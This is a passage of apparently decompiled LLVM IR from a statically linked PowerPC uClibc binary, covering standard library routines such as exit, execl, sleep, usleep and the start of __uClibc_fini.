  uselistorder i32 %v1_1000f0d8, { 1, 0, 2 }
  uselistorder i32 %v0_1000f0b4, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 5, 2, 3, 4, 6 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 7, 2, 3, 6, 4, 5, 8 }
  uselistorder i32* %r30.global-to-local, { 4, 1, 0, 2, 3, 5, 6, 7 }
  uselistorder label %dec_label_pc_1000f1ec, { 1, 0 }
  uselistorder label %dec_label_pc_1000f1e0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000f1ac, { 1, 0 }
  uselistorder label %dec_label_pc_1000f164, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000f12c, { 1, 0 }
  uselistorder label %dec_label_pc_1000f100, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000f0f4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000f0b8, { 1, 0 }
  uselistorder label %dec_label_pc_1000f0b4, { 1, 0 }
  uselistorder label %dec_label_pc_1000f080, { 1, 0 }
}

define i32 @__GI_exit() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1000f21c = ptrtoint i32* %stack_var_-40 to i32
  %v0_1000f228 = load i32, i32* @r3, align 4
  store i32 %v0_1000f228, i32* @r31, align 4
  store i32 %v2_1000f21c, i32* @r3, align 4
  %v0_1000f234 = call i32 @__pthread_return_void()
  %v0_1000f23c = call i32 @__pthread_return_0()
  %v3_1000f244 = load i32, i32* @global_var_1002e62c.900, align 4
  %v3_1000f248 = icmp eq i32 %v3_1000f244, 0
  br i1 %v3_1000f248, label %dec_label_pc_1000f25c, label %dec_label_pc_1000f250

dec_label_pc_1000f250:                            ; preds = %entry
  %v0_1000f250 = load i32, i32* @r31, align 4
  %v3_1000f258 = call i32 @unknown_0(i32 %v0_1000f250, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  br label %dec_label_pc_1000f25c

dec_label_pc_1000f25c:                            ; preds = %entry, %dec_label_pc_1000f250
  store i32 %v2_1000f21c, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v0_1000f264 = call i32 @__pthread_return_void()
  store i32 %v0_1000f264, i32* @r3, align 4
  store i32 268497516, i32* @lr, align 4
  %v1_1000f268 = call i32 @__GI___uClibc_fini(i32 %v0_1000f264)
  br i1 icmp eq (i32 add (i32 ptrtoint (i32* @global_var_10010000.9 to i32), i32 -18216), i32 0), label %dec_label_pc_1000f280, label %dec_label_pc_1000f27c

dec_label_pc_1000f27c:                            ; preds = %dec_label_pc_1000f25c
  store i32 268497536, i32* @lr, align 4
  %v2_1000f27c = call i32 @_stdio_term(i32 %v1_1000f268, i32 add (i32 ptrtoint (i32* @global_var_10010000.9 to i32), i32 -18216))
  br label %dec_label_pc_1000f280

dec_label_pc_1000f280:                            ; preds = %dec_label_pc_1000f25c, %dec_label_pc_1000f27c
  %v0_1000f280 = load i32, i32* @r31, align 4
  %v1_1000f284 = call i32 @__GI__exit(i32 %v0_1000f280)
  ret i32 %v1_1000f284

; uselistorder directives
  uselistorder label %dec_label_pc_1000f280, { 1, 0 }
  uselistorder label %dec_label_pc_1000f25c, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r8.global-to-local, align 4
  %stack_var_8 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000f288 = ptrtoint i32* %stack_var_0 to i32
  %v2_1000f2a4 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000f2a4, i32* %r0.global-to-local, align 4
  %v2_1000f2ac = ptrtoint i32* %stack_var_8 to i32
  store i32 %v2_1000f2a4, i32* %stack_var_-48, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000f2d8

dec_label_pc_1000f2d8:                            ; preds = %dec_label_pc_1000f308, %entry
  %v0_1000f2dc = phi i32 [ 0, %entry ], [ %v1_1000f2dc, %dec_label_pc_1000f308 ]
  %stack_var_-52.0 = phi i32 [ %v2_1000f2ac, %entry ], [ %stack_var_-52.1, %dec_label_pc_1000f308 ]
  %stack_var_-56.0 = phi i8 [ 2, %entry ], [ %stack_var_-56.1, %dec_label_pc_1000f308 ]
  %v4_1000f2d8 = zext i8 %stack_var_-56.0 to i32
  %v1_1000f2dc = add i32 %v0_1000f2dc, 1
  %v1_1000f2e4 = mul nuw nsw i32 %v4_1000f2d8, 4
  store i32 %v1_1000f2e4, i32* %r0.global-to-local, align 4
  %v2_1000f2e8 = add i32 %v1_1000f2e4, %v2_1000f2a4
  store i32 %v2_1000f2e8, i32* %r11.global-to-local, align 4
  %tmp19 = icmp ugt i8 %stack_var_-56.0, 7
  br i1 %tmp19, label %dec_label_pc_1000f2fc, label %dec_label_pc_1000f2f4

dec_label_pc_1000f2f4:                            ; preds = %dec_label_pc_1000f2d8
  %v1_1000f2ec = add i8 %stack_var_-56.0, 1
  br label %dec_label_pc_1000f308

dec_label_pc_1000f2fc:                            ; preds = %dec_label_pc_1000f2d8
  store i32 %stack_var_-52.0, i32* %r11.global-to-local, align 4
  %v1_1000f300 = add i32 %stack_var_-52.0, 4
  store i32 %v1_1000f300, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000f308

dec_label_pc_1000f308:                            ; preds = %dec_label_pc_1000f2f4, %dec_label_pc_1000f2fc
  %stack_var_-52.1 = phi i32 [ %v1_1000f300, %dec_label_pc_1000f2fc ], [ %stack_var_-52.0, %dec_label_pc_1000f2f4 ]
  %v0_1000f308 = phi i32 [ %stack_var_-52.0, %dec_label_pc_1000f2fc ], [ %v2_1000f2e8, %dec_label_pc_1000f2f4 ]
  %stack_var_-56.1 = phi i8 [ %stack_var_-56.0, %dec_label_pc_1000f2fc ], [ %v1_1000f2ec, %dec_label_pc_1000f2f4 ]
  %v1_1000f308 = inttoptr i32 %v0_1000f308 to i32*
  %v2_1000f308 = load i32, i32* %v1_1000f308, align 4
  store i32 %v2_1000f308, i32* %r0.global-to-local, align 4
  %v3_1000f30c = icmp eq i32 %v2_1000f308, 0
  br i1 %v3_1000f30c, label %dec_label_pc_1000f314, label %dec_label_pc_1000f2d8

dec_label_pc_1000f314:                            ; preds = %dec_label_pc_1000f308
  %v1_1000f314 = mul i32 %v1_1000f2dc, 4
  store i32 %v4_1000f288, i32* %r0.global-to-local, align 4
  %v1_1000f31c = add i32 %v1_1000f314, 34
  store i32 %v1_1000f2dc, i32* %ctr.global-to-local, align 4
  %v1_1000f324 = call i32 @__asm_rlwinm(i32 %v1_1000f31c, i32 0, i32 0, i32 27)
  %v1_1000f32c = load i32, i32* @r1, align 4
  %v3_1000f32c = sub i32 %v1_1000f32c, %v1_1000f324
  %v4_1000f32c = inttoptr i32 %v3_1000f32c to i32*
  store i32 %v4_1000f288, i32* %v4_1000f32c, align 4
  %v1_1000f330 = add i32 %v3_1000f32c, 23
  store i32 %v1_1000f330, i32* %r0.global-to-local, align 4
  %v1_1000f334 = call i32 @__asm_rlwinm(i32 %v1_1000f330, i32 0, i32 0, i32 27)
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1000f33c = load i32, i32* %r8.global-to-local, align 4
  %v2_1000f33c = inttoptr i32 %v1_1000f334 to i32*
  store i32 %v0_1000f33c, i32* %v2_1000f33c, align 4
  store i32 %v1_1000f334, i32* %r11.global-to-local, align 4
  %v0_1000f344 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000f344 = trunc i32 %v0_1000f344 to i8
  store i32 %v2_1000f2a4, i32* %r0.global-to-local, align 4
  store i32 %v2_1000f2a4, i32* %stack_var_-48, align 4
  br label %dec_label_pc_1000f358

dec_label_pc_1000f358:                            ; preds = %dec_label_pc_1000f38c.dec_label_pc_1000f358_crit_edge, %dec_label_pc_1000f314
  %v0_1000f35c = phi i32 [ %v1_1000f334, %dec_label_pc_1000f314 ], [ %v0_1000f35c.pre, %dec_label_pc_1000f38c.dec_label_pc_1000f358_crit_edge ]
  %stack_var_-52.2 = phi i32 [ %v2_1000f2ac, %dec_label_pc_1000f314 ], [ %stack_var_-52.3, %dec_label_pc_1000f38c.dec_label_pc_1000f358_crit_edge ]
  %stack_var_-56.2 = phi i8 [ %v1_1000f344, %dec_label_pc_1000f314 ], [ %stack_var_-56.3, %dec_label_pc_1000f38c.dec_label_pc_1000f358_crit_edge ]
  %v1_1000f35c = add i32 %v0_1000f35c, 4
  store i32 %v1_1000f35c, i32* %r11.global-to-local, align 4
  %tmp20 = icmp ugt i8 %stack_var_-56.2, 7
  br i1 %tmp20, label %dec_label_pc_1000f380, label %dec_label_pc_1000f370

dec_label_pc_1000f370:                            ; preds = %dec_label_pc_1000f358
  %v4_1000f358 = zext i8 %stack_var_-56.2 to i32
  %v1_1000f368 = add i8 %stack_var_-56.2, 1
  %v1_1000f364 = mul nuw nsw i32 %v4_1000f358, 4
  %v3_1000f370 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_1000f370, i32* %r0.global-to-local, align 4
  %v2_1000f378 = add i32 %v3_1000f370, %v1_1000f364
  br label %dec_label_pc_1000f38c

dec_label_pc_1000f380:                            ; preds = %dec_label_pc_1000f358
  %v1_1000f384 = add i32 %stack_var_-52.2, 4
  store i32 %v1_1000f384, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000f38c

dec_label_pc_1000f38c:                            ; preds = %dec_label_pc_1000f370, %dec_label_pc_1000f380
  %stack_var_-52.3 = phi i32 [ %v1_1000f384, %dec_label_pc_1000f380 ], [ %stack_var_-52.2, %dec_label_pc_1000f370 ]
  %v0_1000f38c = phi i32 [ %stack_var_-52.2, %dec_label_pc_1000f380 ], [ %v2_1000f378, %dec_label_pc_1000f370 ]
  %stack_var_-56.3 = phi i8 [ %stack_var_-56.2, %dec_label_pc_1000f380 ], [ %v1_1000f368, %dec_label_pc_1000f370 ]
  %v1_1000f38c = inttoptr i32 %v0_1000f38c to i32*
  %v2_1000f38c = load i32, i32* %v1_1000f38c, align 4
  store i32 %v2_1000f38c, i32* %r0.global-to-local, align 4
  %v2_1000f390 = inttoptr i32 %v1_1000f35c to i32*
  store i32 %v2_1000f38c, i32* %v2_1000f390, align 4
  %v0_1000f394 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f394 = add i32 %v0_1000f394, -1
  store i32 %v1_1000f394, i32* %ctr.global-to-local, align 4
  %v2_1000f394 = icmp eq i32 %v1_1000f394, 0
  br i1 %v2_1000f394, label %dec_label_pc_1000f398, label %dec_label_pc_1000f38c.dec_label_pc_1000f358_crit_edge

dec_label_pc_1000f38c.dec_label_pc_1000f358_crit_edge: ; preds = %dec_label_pc_1000f38c
  %v0_1000f35c.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000f358

dec_label_pc_1000f398:                            ; preds = %dec_label_pc_1000f38c
  %v3_1000f39c = load i32, i32* @global_var_1002e634.902, align 4
  store i32 268497828, i32* @lr, align 4
  %v2_1000f3a0 = call i32 @__GI_execve(i32 %v3_1000f39c, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  %v0_1000f3a4 = load i32, i32* @r1, align 4
  %v1_1000f3a4 = inttoptr i32 %v0_1000f3a4 to i32*
  %v2_1000f3a4 = load i32, i32* %v1_1000f3a4, align 4
  store i32 %v2_1000f3a4, i32* %r11.global-to-local, align 4
  %v1_1000f3a8 = add i32 %v2_1000f3a4, 4
  %v2_1000f3a8 = inttoptr i32 %v1_1000f3a8 to i32*
  %v3_1000f3a8 = load i32, i32* %v2_1000f3a8, align 4
  store i32 %v3_1000f3a8, i32* %r0.global-to-local, align 4
  ret i32 %v2_1000f3a0

; uselistorder directives
  uselistorder i32 %v1_1000f394, { 1, 0 }
  uselistorder i8 %stack_var_-56.2, { 2, 0, 3, 1 }
  uselistorder i32 %v1_1000f2e4, { 1, 0 }
  uselistorder i32 %v1_1000f2dc, { 1, 0, 2 }
  uselistorder i8 %stack_var_-56.0, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-52.0, { 0, 1, 3, 2 }
  uselistorder i32 %v2_1000f2a4, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 6, 7, 8, 9, 10, 11, 12, 4, 5 }
  uselistorder i32 27, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8 1, { 0, 1, 11, 12, 2, 3, 13, 10, 14, 9, 8, 7, 6, 5, 4, 15 }
  uselistorder label %dec_label_pc_1000f38c, { 1, 0 }
  uselistorder label %dec_label_pc_1000f308, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-432 = alloca i32, align 4
  %stack_var_-440 = alloca i32, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v3_1000f3bc = icmp eq i32 %arg1, 0
  br i1 %v3_1000f3bc, label %dec_label_pc_1000f570, label %dec_label_pc_1000f3ec.lr.ph

dec_label_pc_1000f3ec.lr.ph:                      ; preds = %entry
  %v2_1000f3e0 = ptrtoint i32* %stack_var_-440 to i32
  store i32 %v2_1000f3e0, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1000f3ec42 = add i32 %v2_1000f3e0, 132
  %v3_1000f3ec43 = inttoptr i32 %v2_1000f3ec42 to i32*
  store i32 0, i32* %v3_1000f3ec43, align 4
  %v0_1000f3f044 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f3f045 = add i32 %v0_1000f3f044, -1
  store i32 %v1_1000f3f045, i32* %r11.global-to-local, align 4
  %v1_1000f3f446 = mul i32 %v1_1000f3f045, 4
  %v1_1000f3f847 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000f3f848 = add i32 %v1_1000f3f847, %v1_1000f3f446
  %v0_1000f3fc49 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f3fc50 = add i32 %v0_1000f3fc49, -1
  store i32 %v1_1000f3fc50, i32* %ctr.global-to-local, align 4
  %v2_1000f3fc51 = icmp eq i32 %v1_1000f3fc50, 0
  br i1 %v2_1000f3fc51, label %dec_label_pc_1000f400, label %dec_label_pc_1000f3ec.dec_label_pc_1000f3ec_crit_edge

dec_label_pc_1000f3ec.dec_label_pc_1000f3ec_crit_edge: ; preds = %dec_label_pc_1000f3ec.lr.ph, %dec_label_pc_1000f3ec.dec_label_pc_1000f3ec_crit_edge
  %v2_1000f3f852 = phi i32 [ %v2_1000f3f8, %dec_label_pc_1000f3ec.dec_label_pc_1000f3ec_crit_edge ], [ %v2_1000f3f848, %dec_label_pc_1000f3ec.lr.ph ]
  %v0_1000f3ec.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_1000f3ec = add i32 %v2_1000f3f852, 8
  %v3_1000f3ec = inttoptr i32 %v2_1000f3ec to i32*
  store i32 %v0_1000f3ec.pre, i32* %v3_1000f3ec, align 4
  %v0_1000f3f0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f3f0 = add i32 %v0_1000f3f0, -1
  store i32 %v1_1000f3f0, i32* %r11.global-to-local, align 4
  %v1_1000f3f4 = mul i32 %v1_1000f3f0, 4
  %v1_1000f3f8 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000f3f8 = add i32 %v1_1000f3f8, %v1_1000f3f4
  %v0_1000f3fc = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f3fc = add i32 %v0_1000f3fc, -1
  store i32 %v1_1000f3fc, i32* %ctr.global-to-local, align 4
  %v2_1000f3fc = icmp eq i32 %v1_1000f3fc, 0
  br i1 %v2_1000f3fc, label %dec_label_pc_1000f400, label %dec_label_pc_1000f3ec.dec_label_pc_1000f3ec_crit_edge

dec_label_pc_1000f400:                            ; preds = %dec_label_pc_1000f3ec.dec_label_pc_1000f3ec_crit_edge, %dec_label_pc_1000f3ec.lr.ph
  %v0_1000f414.pre = load i32, i32* %r8.global-to-local, align 4
  %v2_1000f400 = ptrtoint i32* %stack_var_-432 to i32
  store i32 %v2_1000f400, i32* %r29.global-to-local, align 4
  store i32 %v2_1000f400, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  store i32 %v0_1000f414.pre, i32* %stack_var_-440, align 4
  %v0_1000f418 = call i32 @__sigaddset()
  store i32 %v0_1000f418, i32* %r3.global-to-local, align 4
  %v1_1000f41c = icmp slt i32 %v0_1000f418, 0
  br i1 %v1_1000f41c, label %dec_label_pc_1000f578, label %dec_label_pc_1000f424

dec_label_pc_1000f424:                            ; preds = %dec_label_pc_1000f400
  %v2_1000f424 = ptrtoint i32* %stack_var_-304 to i32
  store i32 %v2_1000f424, i32* @r31, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268497976, i32* @lr, align 4
  %v3_1000f434 = call i32 @__GI_sigprocmask(i32 0, i32 %v2_1000f400, i32 %v2_1000f424)
  store i32 %v3_1000f434, i32* %r3.global-to-local, align 4
  %v3_1000f438 = icmp eq i32 %v3_1000f434, 0
  br i1 %v3_1000f438, label %dec_label_pc_1000f440, label %dec_label_pc_1000f578

dec_label_pc_1000f440:                            ; preds = %dec_label_pc_1000f424
  store i32 %v2_1000f424, i32* %r3.global-to-local, align 4
  %v2_1000f448 = call i32 @__sigismember(i32 %v2_1000f424, i32 17)
  store i32 %v2_1000f448, i32* %r3.global-to-local, align 4
  %v3_1000f44c = icmp eq i32 %v2_1000f448, 0
  br i1 %v3_1000f44c, label %dec_label_pc_1000f46c.lr.ph, label %dec_label_pc_1000f538

dec_label_pc_1000f46c.lr.ph:                      ; preds = %dec_label_pc_1000f440
  store i32 %v2_1000f3e0, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %v3_1000f3ec43, align 4
  %v0_1000f47033 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f47034 = add i32 %v0_1000f47033, -1
  store i32 %v1_1000f47034, i32* %r11.global-to-local, align 4
  %v1_1000f47435 = mul i32 %v1_1000f47034, 4
  %v1_1000f47836 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000f47837 = add i32 %v1_1000f47836, %v1_1000f47435
  %v0_1000f47c38 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f47c39 = add i32 %v0_1000f47c38, -1
  store i32 %v1_1000f47c39, i32* %ctr.global-to-local, align 4
  %v2_1000f47c40 = icmp eq i32 %v1_1000f47c39, 0
  br i1 %v2_1000f47c40, label %dec_label_pc_1000f480, label %dec_label_pc_1000f46c.dec_label_pc_1000f46c_crit_edge

dec_label_pc_1000f46c.dec_label_pc_1000f46c_crit_edge: ; preds = %dec_label_pc_1000f46c.lr.ph, %dec_label_pc_1000f46c.dec_label_pc_1000f46c_crit_edge
  %v2_1000f47841 = phi i32 [ %v2_1000f478, %dec_label_pc_1000f46c.dec_label_pc_1000f46c_crit_edge ], [ %v2_1000f47837, %dec_label_pc_1000f46c.lr.ph ]
  %v0_1000f46c.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_1000f46c = add i32 %v2_1000f47841, 8
  %v3_1000f46c = inttoptr i32 %v2_1000f46c to i32*
  store i32 %v0_1000f46c.pre, i32* %v3_1000f46c, align 4
  %v0_1000f470 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f470 = add i32 %v0_1000f470, -1
  store i32 %v1_1000f470, i32* %r11.global-to-local, align 4
  %v1_1000f474 = mul i32 %v1_1000f470, 4
  %v1_1000f478 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000f478 = add i32 %v1_1000f478, %v1_1000f474
  %v0_1000f47c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f47c = add i32 %v0_1000f47c, -1
  store i32 %v1_1000f47c, i32* %ctr.global-to-local, align 4
  %v2_1000f47c = icmp eq i32 %v1_1000f47c, 0
  br i1 %v2_1000f47c, label %dec_label_pc_1000f480, label %dec_label_pc_1000f46c.dec_label_pc_1000f46c_crit_edge

dec_label_pc_1000f480:                            ; preds = %dec_label_pc_1000f46c.dec_label_pc_1000f46c_crit_edge, %dec_label_pc_1000f46c.lr.ph
  store i32 %v2_1000f400, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  %v0_1000f488 = call i32 @__sigaddset()
  store i32 %v0_1000f488, i32* %r3.global-to-local, align 4
  %v1_1000f48c = icmp slt i32 %v0_1000f488, 0
  br i1 %v1_1000f48c, label %dec_label_pc_1000f578, label %dec_label_pc_1000f494

dec_label_pc_1000f494:                            ; preds = %dec_label_pc_1000f480
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_1000f49c = ptrtoint i32* %stack_var_-176 to i32
  store i32 268498084, i32* @lr, align 4
  %v4_1000f4a0 = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_1000f49c)
  store i32 %v4_1000f4a0, i32* %r3.global-to-local, align 4
  %tmp30 = icmp sgt i32 %v4_1000f4a0, -1
  br i1 %tmp30, label %dec_label_pc_1000f4d4, label %dec_label_pc_1000f4ac

dec_label_pc_1000f4ac:                            ; preds = %dec_label_pc_1000f494
  %v0_1000f4ac = call i32 @__errno_location()
  store i32 %v0_1000f4ac, i32* %r3.global-to-local, align 4
  %v1_1000f4b4 = inttoptr i32 %v0_1000f4ac to i32*
  %v2_1000f4b4 = load i32, i32* %v1_1000f4b4, align 4
  store i32 %v0_1000f4ac, i32* %r29.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268498120, i32* @lr, align 4
  %v3_1000f4c4 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_1000f424, i32 0)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_1000f4cc = inttoptr i32 %v0_1000f4ac to i32*
  store i32 %v2_1000f4b4, i32* %v2_1000f4cc, align 4
  %v0_1000f58c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f57c

dec_label_pc_1000f4d4:                            ; preds = %dec_label_pc_1000f494
  %v3_1000f4d4 = load i32, i32* %stack_var_-176, align 4
  %v3_1000f4e0 = icmp eq i32 %v3_1000f4d4, 1
  br i1 %v3_1000f4e0, label %dec_label_pc_1000f4e8, label %dec_label_pc_1000f51c

dec_label_pc_1000f4e8:                            ; preds = %dec_label_pc_1000f4d4
  store i32 %v2_1000f3e0, i32* %r3.global-to-local, align 4
  store i32 268498164, i32* @lr, align 4
  %v2_1000f4f0 = call i32 @__libc_nanosleep(i32 %v2_1000f3e0, i32 %v2_1000f3e0)
  store i32 %v2_1000f4f0, i32* %r3.global-to-local, align 4
  store i32 %v2_1000f4f0, i32* @r31, align 4
  %v0_1000f4f8 = call i32 @__errno_location()
  store i32 %v0_1000f4f8, i32* %r3.global-to-local, align 4
  store i32 %v0_1000f4f8, i32* %r29.global-to-local, align 4
  %v1_1000f508 = inttoptr i32 %v0_1000f4f8 to i32*
  %v2_1000f508 = load i32, i32* %v1_1000f508, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268498196, i32* @lr, align 4
  %v3_1000f510 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_1000f424, i32 0)
  store i32 %v3_1000f510, i32* %r3.global-to-local, align 4
  %v1_1000f514 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000f514 = inttoptr i32 %v1_1000f514 to i32*
  store i32 %v2_1000f508, i32* %v2_1000f514, align 4
  %v0_1000f544.pr = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000f544

dec_label_pc_1000f51c:                            ; preds = %dec_label_pc_1000f4d4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268498220, i32* @lr, align 4
  %v3_1000f528 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_1000f424, i32 0)
  br label %dec_label_pc_1000f538

dec_label_pc_1000f538:                            ; preds = %dec_label_pc_1000f440, %dec_label_pc_1000f51c
  store i32 %v2_1000f3e0, i32* %r3.global-to-local, align 4
  store i32 268498240, i32* @lr, align 4
  %v2_1000f53c = call i32 @__libc_nanosleep(i32 %v2_1000f3e0, i32 %v2_1000f3e0)
  store i32 %v2_1000f53c, i32* %r3.global-to-local, align 4
  store i32 %v2_1000f53c, i32* @r31, align 4
  br label %dec_label_pc_1000f544

dec_label_pc_1000f544:                            ; preds = %dec_label_pc_1000f4e8, %dec_label_pc_1000f538
  %v0_1000f544 = phi i32 [ %v0_1000f544.pr, %dec_label_pc_1000f4e8 ], [ %v2_1000f53c, %dec_label_pc_1000f538 ]
  %v3_1000f544 = icmp eq i32 %v0_1000f544, 0
  br i1 %v3_1000f544, label %dec_label_pc_1000f570, label %dec_label_pc_1000f54c

dec_label_pc_1000f54c:                            ; preds = %dec_label_pc_1000f544
  %v3_1000f55c = load i32, i32* %stack_var_-440, align 4
  %v0_1000f560 = call i32 @__asm_mfcr()
  store i32 %v0_1000f560, i32* %r3.global-to-local, align 4
  %v1_1000f564 = call i32 @__asm_rlwinm(i32 %v0_1000f560, i32 30, i32 31, i32 31)
  %v2_1000f568 = add i32 %v3_1000f55c, %v1_1000f564
  store i32 %v2_1000f568, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f57c

dec_label_pc_1000f570:                            ; preds = %dec_label_pc_1000f544, %entry
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f57c

dec_label_pc_1000f578:                            ; preds = %dec_label_pc_1000f424, %dec_label_pc_1000f480, %dec_label_pc_1000f400
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f57c

dec_label_pc_1000f57c:                            ; preds = %dec_label_pc_1000f570, %dec_label_pc_1000f54c, %dec_label_pc_1000f4ac, %dec_label_pc_1000f578
  %v0_1000f58c = phi i32 [ 0, %dec_label_pc_1000f570 ], [ %v2_1000f568, %dec_label_pc_1000f54c ], [ %v0_1000f58c.pre, %dec_label_pc_1000f4ac ], [ -1, %dec_label_pc_1000f578 ]
  ret i32 %v0_1000f58c

; uselistorder directives
  uselistorder i32 %v1_1000f47c, { 1, 0 }
  uselistorder i32 %v2_1000f424, { 2, 1, 0, 4, 3, 5, 6 }
  uselistorder i32 %v1_1000f3fc, { 1, 0 }
  uselistorder i32 %v2_1000f3e0, { 2, 1, 3, 6, 5, 4, 7, 0, 8 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 3, 5, 4, 2, 6, 0, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 1 }
  uselistorder i32* %r11.global-to-local, { 7, 6, 0, 4, 5, 9, 8, 1, 2, 3 }
  uselistorder i32* %ctr.global-to-local, { 7, 6, 0, 2, 3, 9, 8, 1, 4, 5 }
  uselistorder i32 (i32, i32)* @__sigismember, { 1, 0 }
  uselistorder label %dec_label_pc_1000f57c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000f578, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000f544, { 1, 0 }
  uselistorder label %dec_label_pc_1000f538, { 1, 0 }
  uselistorder label %dec_label_pc_1000f46c.dec_label_pc_1000f46c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000f3ec.dec_label_pc_1000f3ec_crit_edge, { 1, 0 }
}

define i32 @usleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_1000f5ac = udiv i32 %arg1, 1000000
  %v2_1000f5b0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000f5ac, i32* %stack_var_-24, align 4
  store i32 268498380, i32* @lr, align 4
  %v2_1000f5c8 = call i32 @__libc_nanosleep(i32 %v2_1000f5b0, i32 0)
  ret i32 %v2_1000f5c8

; uselistorder directives
  uselistorder i32 (i32, i32)* @__libc_nanosleep, { 2, 1, 0 }
}

define i32 @__GI___uClibc_fini(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000f62c:
  %v3_1000f630 = load i32, i32* @global_var_1002e63c.904, align 4
  %v3_1000f634 = icmp eq i32 %v3_1000f630, 0
  br i1 %v3_1000f634, label %dec_label_pc_1000f644, label %dec_label_pc_1000f63c

dec_label_pc_1000f63c:                            ; preds = %dec_label_pc_1000f62c
  %v2_1000f640 = load i32, i32* @r4, align 4
  %v3_1000f640 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 %v2_1000f640)
  store i32 %v3_1000f640, i32* @r3, align 4
  br label %dec_label_pc_1000f644

dec_label_pc_1000f644:                            ; preds = %dec_label_pc_1000f62c, %dec_label_pc_1000f63c
  %v3_1000f648 = load i32, i32* @global_var_1002e640.905, align 4
  %v3_1000f64c = icmp eq i32 %v3_1000f648, 0
